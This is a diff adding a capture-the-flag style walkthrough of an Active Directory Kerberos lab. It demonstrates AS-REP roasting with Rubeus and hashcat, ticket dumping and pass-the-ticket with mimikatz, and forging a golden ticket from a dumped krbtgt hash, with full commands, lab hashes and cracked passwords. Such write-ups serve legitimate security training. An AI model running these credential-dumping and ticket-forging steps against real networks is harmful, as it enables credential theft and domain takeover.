@@ -564,3 +564,570 @@ C:\Users\Administrator\Downloads>Rubeus.exe asreproast
 [*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
 [+] AS-REQ w/o preauth successful!
 [*] AS-REP hash:
+
+      $krb5asrep$User3@CONTROLLER.local:2F048AAD73B34BA5279B9E63452FF183$364FC49F66919
+      DAD2DF8258620968B295A09CB03E350C9F629CFD5A8EECB172E304D53BC39D60803BD45D3256A173
+      74136075147C5AE2363866FCC1C43C0233F97FEF714E4DC68B01C9BE0E63B46BB8B4E5E6351E4E05
+      1F189C1937F049E4D4690CA6C05F5A6024B475F9D6B523340923BC6B31509220836CC0A7D424D842
+      47F937FCE647A52EE0FF7DD1276CBE32271E83F08A98C0BE72B8F7930F0DCB546517A1D08EB011A5
+      6A87F69432481411DB6519F3C73C3E71CE0252F7D5C670A893A283CCA1D839949BD81AE76196981F
+      AF4E05862A6E71D982F5B1AB1556ECAB520709BEABF065AE76922829C34318A56251E0C5B48
+```
+```add 23$ after rep
+cat hash3.txt                                   
+$krb5asrep$23$User3@CONTROLLER.local:2F048AAD73B34BA5279B9E63452FF183$364FC49F66919DAD2DF8258620968B295A09CB03E350C9F629CFD5A8EECB172E304D53BC39D60803BD45D3256A17374136075147C5AE2363866FCC1C43C0233F97FEF714E4DC68B01C9BE0E63B46BB8B4E5E6351E4E051F189C1937F049E4D4690CA6C05F5A6024B475F9D6B523340923BC6B31509220836CC0A7D424D84247F937FCE647A52EE0FF7DD1276CBE32271E83F08A98C0BE72B8F7930F0DCB546517A1D08EB011A56A87F69432481411DB6519F3C73C3E71CE0252F7D5C670A893A283CCA1D839949BD81AE76196981FAF4E05862A6E71D982F5B1AB1556ECAB520709BEABF065AE76922829C34318A56251E0C5B48
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_kerberos]
+└─$ hashcat -m 18200 hash3.txt Pass.txt      
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1243/2550 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: Pass.txt
+* Passwords.: 1240
+* Bytes.....: 9706
+* Keyspace..: 1240
+
+$krb5asrep$23$User3@CONTROLLER.local:2f048aad73b34ba5279b9e63452ff183$364fc49f66919dad2df8258620968b295a09cb03e350c9f629cfd5a8eecb172e304d53bc39d60803bd45d3256a17374136075147c5ae2363866fcc1c43c0233f97fef714e4dc68b01c9be0e63b46bb8b4e5e6351e4e051f189c1937f049e4d4690ca6c05f5a6024b475f9d6b523340923bc6b31509220836cc0a7d424d84247f937fce647a52ee0ff7dd1276cbe32271e83f08a98c0be72b8f7930f0dcb546517a1d08eb011a56a87f69432481411db6519f3c73c3e71ce0252f7d5c670a893a283cca1d839949bd81ae76196981faf4e05862a6e71d982f5b1ab1556ecab520709beabf065ae76922829c34318a56251e0c5b48:Password3
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$User3@CONTROLLER.local:2f048aad73b34b...0c5b48
+Time.Started.....: Sat Aug 20 14:35:17 2022 (0 secs)
+Time.Estimated...: Sat Aug 20 14:35:17 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (Pass.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   456.9 kH/s (0.93ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 1024/1240 (82.58%)
+Rejected.........: 0/1024 (0.00%)
+Restore.Point....: 0/1240 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> moomoo
+Hardware.Mon.#1..: Util: 26%
+
+Started: Sat Aug 20 14:35:16 2022
+Stopped: Sat Aug 20 14:35:19 2022
+```
+What hash type does AS-REP Roasting use?
+*Kerberos 5, etype 23, AS-REP*
+Which User is vulnerable to AS-REP Roasting?
+*User3*
+What is the User's Password?
+*Password3*
+Which Admin is vulnerable to AS-REP Roasting?
+*Admin2*
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_kerberos]
+└─$ nano hash4.txt
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_kerberos]
+└─$ hashcat -m 18200 hash4.txt Pass.txt
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1243/2550 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: Pass.txt
+* Passwords.: 1240
+* Bytes.....: 9706
+* Keyspace..: 1240
+
+$krb5asrep$23$Admin2@CONTROLLER.local:312d3e75042839a3af33ca7292416983$1139e48ee8ef89392f0eea38bf7b035ead1c641713e71aa24ad008b117330c81c262fc9aff21f63bcdd5c7c090f1df3cb014a79eaffa554811decedc5a1aa368c20cbdb469fe6c40a6e63c8abf93d5aa8678ef3675747797b58b3a2aaa9e5aaa0ddb49fbca36bdb038d05496d396003d22e3fb958957d1a5e1f4cb2a85369dfbd2ec960a11000c0aaf918fd3d9884d30738bc1a5a8d9406e4de2d032ba5cb22559153349cb86b3ad86b9b66dfa6795894fd0015a78836eb13d0b8c97f2af9989a3f15371f4d427c6d4b7391cf5a6045f450f7d3dcb722188cee829a737c117df88222b51580f9c91f9dc7861a7e1b5d0a18de797:P@$$W0rd2
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$Admin2@CONTROLLER.local:312d3e7504283...8de797
+Time.Started.....: Sat Aug 20 14:37:35 2022 (0 secs)
+Time.Estimated...: Sat Aug 20 14:37:35 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (Pass.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   424.3 kH/s (0.99ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 1024/1240 (82.58%)
+Rejected.........: 0/1024 (0.00%)
+Restore.Point....: 0/1240 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> moomoo
+Hardware.Mon.#1..: Util: 29%
+
+Started: Sat Aug 20 14:37:34 2022
+Stopped: Sat Aug 20 14:37:37 2022
+```
+What is the Admin's Password?
+`P@$$W0rd2`
+### Pass the Ticket w/ mimikatz
+Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory
+This will only be an overview of how the pass the ticket attacks work as THM does not currently support networks but I challenge you to configure this on your own network.
+You can run this attack on the given machine however you will be escalating from a domain admin to a domain admin because of the way the domain controller is set up.
+Pass the Ticket Overview -
+Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.
+![](https://i.imgur.com/V6SOlll.png)
+Prepare Mimikatz & Dump Tickets -
+You will need to run the command prompt as an administrator: use the same credentials as you did to get into the machine. If you don't have an elevated command prompt mimikatz will not work properly.
+1.) cd Downloads - navigate to the directory mimikatz is in
+2.) mimikatz.exe - run mimikatz
+3.) privilege::debug - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
+![](https://i.imgur.com/SJQGplV.png)
+4.) sekurlsa::tickets /export - this will export all of the .kirbi tickets into the directory that you are currently in
+At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier
+![](https://i.imgur.com/xC0L5Kf.png)
+When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like the one outlined in red above.
+Pass the Ticket w/ Mimikatz
+Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.
+1.) kerberos::ptt </ticket> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket
+![](https://i.imgur.com/DwXmm8Z.png)
+2.) klist - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
+We will not be using mimikatz for the rest of the attack.
+![](https://i.imgur.com/GgxDm9k.png)
+3.) You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.
+![](https://i.imgur.com/9nxjeTS.png)
+Note that this is only a POC to understand how to pass the ticket and gain domain admin the way that you approach passing the ticket may be different based on what kind of engagement you're in so do not take this as a definitive guide of how to run this attack.
+Pass the Ticket Mitigation -
+Let's talk blue team and how to mitigate these types of attacks.
+Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.
+```text
+C:\Users\Administrator\Downloads>dir
+ Volume in drive C has no label.
+ Volume Serial Number is E203-08FF
+
+ Directory of C:\Users\Administrator\Downloads
+
+05/25/2020  03:45 PM    <DIR>          .
+05/25/2020  03:45 PM    <DIR>          ..
+05/25/2020  03:45 PM         1,263,880 mimikatz.exe
+05/25/2020  03:14 PM           212,480 Rubeus.exe
+               2 File(s)      1,476,360 bytes
+               2 Dir(s)  50,897,174,528 bytes free
+
+C:\Users\Administrator\Downloads>mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::tickets /export
+
+Authentication Id : 0 ; 3098262 (00000000:002f4696)
+Session           : Service from 0
+User Name         : sshd_2616
+Domain            : VIRTUAL USERS
+Logon Server      : (null)
+Logon Time        : 8/20/2022 10:38:21 AM
+SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-2616
+
+         * Username : CONTROLLER-1$
+         * Domain   : CONTROLLER.local
+         * Password : 4b b7 68 03 2c 8d ee f8 57 71 34 0c 66 1b 50 d7 05 62 88 2d e7 dc 63 3d 35 04 b5 16 f7 c7 6d 5f a0 ea b9 36 46 57 ad be 33 5f da 34 ca c6 2c a7 ac 0a b4 ea 24 3f c1 ba 5e ed 23 f5 b1 f1 b8 50 2a 95 c2 39 8e 2b ec 3f e1 c9 e7 07 97 97 1f 69 3b 42 b6 a1 ce e8 09 32 2e 11 6b a5 3b 6b 63 14 26 d9 10 a1 be ef bc 4c 91 6d 59 ea e2 e1 04 fc bf 73 a0 0c 2d b0 db 16 4c 1b 18 4e 3a 52 7e 49 0c 98 a3 32 aa a5 3b 3f d9 0f 97 3c 69 03 31 0d 2b 2d 7d a6 09 87 ab d5 01 8d 00 d0 01 5e da 99 88 2a 88 ef 03 f1 69 f8 c6 6e 9d 6f 19 69 df 46 d4 5a a8 e5 a9 26 4e 69 66 13 86 14 de f0 32 66 90 fc e2 b3 25 9a 69 89 6e a1 02 88 66 d2 98 80 cb 39 27 25 46 26 a6 08 29 f3 92 83 75 e0 43 ec 23 7a 0b 78 b1 d2 d6 c4 03 1c b9 74 3f 23 5d 95
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+   Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 8/20/2022 10:05:33 AM ; 8/20/2022 8:05:33 PM ; 8/27/2022 10:05:33 AM
+           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
+           Target Name  (--) : @ CONTROLLER.LOCAL
+           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( $$Delegation Ticket$$ )
+           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             bb4c0b714ae6c612584bb477c9fb90fed3cc6fa5e871bff3d2e819eba99dfdf1
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+           * Saved to file [0;3e7]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !
+         [00000001]
+           Start/End/MaxRenew: 8/20/2022 10:05:33 AM ; 8/20/2022 8:05:33 PM ; 8/27/2022 10:05:33 AM
+           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
+           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
+           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
+           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             6640835d436410ec68458fc63e21d7deca154569886409891b1af864a65fc2a0
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+           * Saved to file [0;3e7]-2-1-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !
+mimikatz # kerberos::ptt [0;1ff6a2]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+
+* File: '[0;1ff6a2]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK
+```
+I understand how a pass the ticket attack works *No answer needed*
+![](https://img-blog.csdn.net/20150912220534137)
+### Golden/Silver Ticket Attacks w/ mimikatz
+Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to create a silver ticket.
+A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.
+A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.
+KRBTGT Overview
+In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.
+Golden/Silver Ticket Attack Overview -
+A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.
+![](https://i.imgur.com/GT1kkfo.png)
+Dump the krbtgt hash -
+﻿1.) cd downloads && mimikatz.exe - navigate to the directory mimikatz is in and run mimikatz
+2.) privilege::debug - ensure this outputs [privilege '20' ok]
+﻿3.) lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
+![](https://i.imgur.com/VOEsU4O.png)
+Create a Golden/Silver Ticket -
+﻿1.) Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
+I'll show you a demo of creating a golden ticket it is up to you to create a silver ticket.
+![](https://i.imgur.com/rh06qDl.png)
+Use the Golden/Silver Ticket to access other machines -
+﻿1.) misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz.
+2.) Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
+![](https://i.imgur.com/BSh4rXy.png)
+This attack will not work without other machines on the domain however I challenge you to configure this on your own network and try out these attacks.
+```text
+C:\Users\Administrator>cd downloads && mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::lsa /inject /name:krbtgt
+Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860
+
+RID  : 000001f6 (502)
+User : krbtgt
+
+ * Primary
+    NTLM : 72cd714611b64cd4d5550cd2759db3f6
+    LM   :
+  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6
+    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
+    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6
+
+ * WDigest
+    01  d2e9aa3caa4509c3f11521c70539e4ad
+    02  c9a868fc195308b03d72daa4a5a4ee47
+    03  171e066e448391c934d0681986f09ff4
+    04  d2e9aa3caa4509c3f11521c70539e4ad
+    05  c9a868fc195308b03d72daa4a5a4ee47
+    06  41903264777c4392345816b7ecbf0885
+    07  d2e9aa3caa4509c3f11521c70539e4ad
+    08  9a01474aa116953e6db452bb5cd7dc49
+    09  a8e9a6a41c9a6bf658094206b51a4ead
+    10  8720ff9de506f647ad30f6967b8fe61e
+    11  841061e45fdc428e3f10f69ec46a9c6d
+    12  a8e9a6a41c9a6bf658094206b51a4ead
+    13  89d0db1c4f5d63ef4bacca5369f79a55
+    14  841061e45fdc428e3f10f69ec46a9c6d
+    15  a02ffdef87fc2a3969554c3f5465042a
+    16  4ce3ef8eb619a101919eee6cc0f22060
+    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
+    18  085f371533fc3860fdbf0c44148ae730
+    19  265525114c2c3581340ddb00e018683b
+    20  f5708f35889eee51a5fa0fb4ef337a9b
+    21  bffaf3c4eba18fd4c845965b64fca8e2
+    22  bffaf3c4eba18fd4c845965b64fca8e2
+    23  3c10f0ae74f162c4b81bf2a463a344aa
+    24  96141c5119871bfb2a29c7ea7f0facef
+    25  f9e06fa832311bd00a07323980819074
+    26  99d1dd6629056af22d1aea639398825b
+    27  919f61b2c84eb1ff8d49ddc7871ab9e0
+    28  d5c266414ac9496e0e66ddcac2cbcc3b
+    29  aae5e850f950ef83a371abda478e05db
+
+ * Kerberos
+    Default Salt : CONTROLLER.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 79bf07137a8a6b8f
+
+ * Kerberos-Newer-Keys
+    Default Salt : CONTROLLER.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033
+      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b
+      des_cbc_md5       (4096) : 79bf07137a8a6b8f
+
+ * NTLM-Strong-NTOWF
+    Random Value : 4b9102d709aada4d56a27b6c3cd14223
+
+mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
+ERROR kuhl_m_kerberos_golden ; Missing krbtgt key argument (/rc4 or /aes128 or /aes256)
+
+mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
+User      : Administrator
+Domain    : controller.local (CONTROLLER)
+SID       : S-1-5-21-432953485-3795405108-1502158860
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_nt
+Lifetime  : 8/20/2022 12:12:15 PM ; 8/17/2032 12:12:15 PM ; 8/17/2032 12:12:15 PM
+-> Ticket : ticket.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+```
+```text
+C:\Users\Administrator\Downloads>dir
+ Volume in drive C has no label.
+ Volume Serial Number is E203-08FF
+
+ Directory of C:\Users\Administrator\Downloads
+
+08/20/2022  12:12 PM    <DIR>          .
+08/20/2022  12:12 PM    <DIR>          ..
+05/25/2020  03:45 PM         1,263,880 mimikatz.exe
+05/25/2020  03:14 PM           212,480 Rubeus.exe
+08/20/2022  12:12 PM             1,429 ticket.kirbi
+08/20/2022  11:47 AM             1,787 [0;19dd6f]-1-0-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi
+08/20/2022  11:47 AM             1,761 [0;1ff6a2]-0-0-40a10000-Administrator@CONTROLLER-1-HTTPService.CONTROLLER.local~30222.kirbi
+08/20/2022  11:47 AM             1,759 [0;1ff6a2]-0-1-40a10000-Administrator@CONTROLLER-1-SQLService.CONTROLLER.local~30111.kirbi
+08/20/2022  11:47 AM             1,595 [0;1ff6a2]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+08/20/2022  11:47 AM             1,587 [0;2d3e27]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
+08/20/2022  11:47 AM             1,761 [0;2f5a8f]-0-0-40a10000-Administrator@CONTROLLER-1-HTTPService.CONTROLLER.local~30222.kirbi
+08/20/2022  11:47 AM             1,759 [0;2f5a8f]-0-1-40a10000-Administrator@CONTROLLER-1-SQLService.CONTROLLER.local~30111.kirbi
+08/20/2022  11:47 AM             1,595 [0;2f5a8f]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+08/20/2022  11:47 AM             1,755 [0;352df]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
+08/20/2022  11:47 AM             1,587 [0;354dd]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
+08/20/2022  11:47 AM             1,791 [0;3e4]-0-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
+08/20/2022  11:47 AM             1,587 [0;3e4]-2-0-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
+08/20/2022  11:47 AM             1,755 [0;3e7]-0-0-40a50000-CONTROLLER-1$@HTTP-CONTROLLER-1.CONTROLLER.local.kirbi
+08/20/2022  11:47 AM             1,787 [0;3e7]-0-1-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi
+08/20/2022  11:47 AM             1,721 [0;3e7]-0-2-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.kirbi
+08/20/2022  11:47 AM             1,711 [0;3e7]-0-3-40a50000.kirbi
+08/20/2022  11:47 AM             1,791 [0;3e7]-0-4-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.CONTROLLER.local.kirbi
+08/20/2022  11:47 AM             1,791 [0;3e7]-0-5-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi
+08/20/2022  11:47 AM             1,755 [0;3e7]-0-6-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
+08/20/2022  11:47 AM             1,721 [0;3e7]-0-7-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.kirbi
+08/20/2022  11:47 AM             1,647 [0;3e7]-1-0-00a50000.kirbi
+08/20/2022  11:47 AM             1,647 [0;3e7]-1-1-00a50000.kirbi
+08/20/2022  11:47 AM             1,587 [0;3e7]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
+08/20/2022  11:47 AM             1,587 [0;3e7]-2-1-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
+08/20/2022  11:47 AM             1,755 [0;6a6e9]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
+08/20/2022  11:47 AM             1,755 [0;6a745]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
+08/20/2022  11:47 AM             1,791 [0;6a781]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi
+08/20/2022  11:47 AM             1,755 [0;6a7ba]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
+              31 File(s)      1,525,669 bytes
+               2 Dir(s)  50,935,459,840 bytes free
+
+C:\Users\Administrator\Downloads>
+```
+*ntlm*
+```sqlservice
+mimikatz # lsadump::lsa /inject /name:SQLSERVICE
+Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860
+
+RID  : 00000455 (1109)
+User : SQLSERVICE
+
+ * Primary
+    NTLM : cd40c9ed96265531b21fc5b1dafcfb0a
+    LM   :
+  Hash NTLM: cd40c9ed96265531b21fc5b1dafcfb0a
+    ntlm- 0: cd40c9ed96265531b21fc5b1dafcfb0a
+    lm  - 0: 7bb53f77cde2f49c17190f7a071bd3a0
+
+ * WDigest
+    01  ba42b3f2ef362e231faca14b6dea61ef
+    02  00a0374f4ac4bce4adda196e458dd8b8
+    03  f39d8d3e34a4e2eac8f6d4b62fe52d06
+    04  ba42b3f2ef362e231faca14b6dea61ef
+    05  98c65218e4b7b8166943191cd8c35c23
+    06  6eccb56cda1444e3909322305ed04b37
+    07  25b7998ce2e7b826a576a43f89702921
+    08  8609a1da5628a4016d32f9eb73314fa0
+    09  277f84c6c59728fb963a6ee1a3b27f0d
+    10  63a9f69e8b36c3e0612ec8784b9c7599
+    11  47cb5c436807396994f1b9ccc8d2f8e1
+    12  46f2c402d8731ed6dca07f5dbc71a604
+    13  2990e284070a014e54c749a6f96f9be7
+    14  c059f85b7f01744dc0a2a013978a965f
+    15  3600c835f3e81858a77e74370e047e29
+    16  bd9c013f8a3f743f8a5b553e8a275a88
+    17  c1d94e24d26fdaad4d6db039058c292e
+    18  1a433c0634b50c567bac222be4eac871
+    19  78d7a7573e4af2b8649b0280cd75636d
+    20  136ddfa7840610480a76777f3be007e0
+    21  7a4a266a64910bb3e5651994ba6d7fb4
+    22  a75ec46a7a473e90da499c599bc3d3cb
+    23  8d3db50354c0744094334562adf74c2a
+    24  7d07406132d671f73a139ff89da5d72e
+    25  dd1e02d5c5b8ae969d903a0bc63d9191
+    26  27da7fc766901eac79eba1a970ceb7da
+    27  09333600bcc68ee149f449321a5efb27
+    28  1c550f8b3af2eb4efda5c34aa8a1c549
+    29  3cd9326a300d2261451d1504832cb062
+
+ * Kerberos
+    Default Salt : CONTROLLER.LOCALSQLService
+    Credentials
+      des_cbc_md5       : 5d5dae0dc10e7aec
+
+ * Kerberos-Newer-Keys
+    Default Salt : CONTROLLER.LOCALSQLService
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : a3a6dbd4d6fa895b600c28bfdaf6b52d59d46a6eb1f455bc08a19b7e8cdab76d
+      aes128_hmac       (4096) : 629b46af543142f77cabcf14afb1caea
